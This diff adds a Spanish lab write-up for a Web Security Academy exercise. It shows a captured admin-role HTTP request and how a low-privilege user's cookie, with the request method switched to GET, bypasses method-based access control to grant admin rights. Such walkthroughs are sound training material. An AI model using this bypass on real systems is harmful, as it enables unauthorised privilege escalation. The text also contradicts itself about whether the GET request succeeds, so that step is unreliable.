@@ -156,5 +156,54 @@ Colocando los parametro en la en el primer encabezado, pero los recursos en el e
 
 ## 6. Lab: Method-based access control can be circumvented
 
+```
+Este laboratorio implementa controles de acceso basados ​​en parte en el método HTTP de solicitudes. Puede familiarizarse con el panel de administración iniciando sesión con administrator:admin.
+
+Para resolver el laboratorio, inicie sesión utilizando wiener:peter y aproveche los controles de acceso defectuosos para promocionarse y convertirse en administrador.
+```
+
+Accedemos al laboratorio con la cuenta del administrador e interceptamos el paquete HTTP request que genera al convertir al usuario **carlos** en admin y lo enviamos al repeater.
+
+```
+POST /admin-roles HTTP/1.1
+Host: ace21f4c1ea57d8680e6c37900810025.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://ace21f4c1ea57d8680e6c37900810025.web-security-academy.net
+DNT: 1
+Connection: close
+Referer: https://ace21f4c1ea57d8680e6c37900810025.web-security-academy.net/admin
+Cookie: session=J6CrF7hou8LPDDov83TPBJeKxGNCOkaW
+Upgrade-Insecure-Requests: 1
+
+username=carlos&action=upgrade
+```
+
+Ahora, lo que haremos será cerrar sesion y logearnos con nuestras credenciales **wiener:peter** y obtener nuestra cookie de usuario.
+
+```
+Cookie: session=mCif4mmDpvd2sDh9TacvqolV2z4lX6Jc
+```
+
+Ahora lo que haremos será ir al repeater, y cambiar los valores de la cookie por la nuestra y el usuaro **carlos** por **wiener** , luego enviamos.
+
+![](img19.png)
+
+Podemos ver que no nos permite acceder al recurso, ahora intentaremos con otro metodo que podría ser **GET**, para esto lo que ahoremos será en el repeater, clic derecho y luego en **Change request method**.
+
+![](img20.png)
+
+Y vemos que no lo permite, ahora solo vamos a la web desde el navegador para verificar que completamos el laboratorio.
+
+![](img21.png)
+
+## 7. Lab: User ID controlled by request parameter
+
+
+
 
 
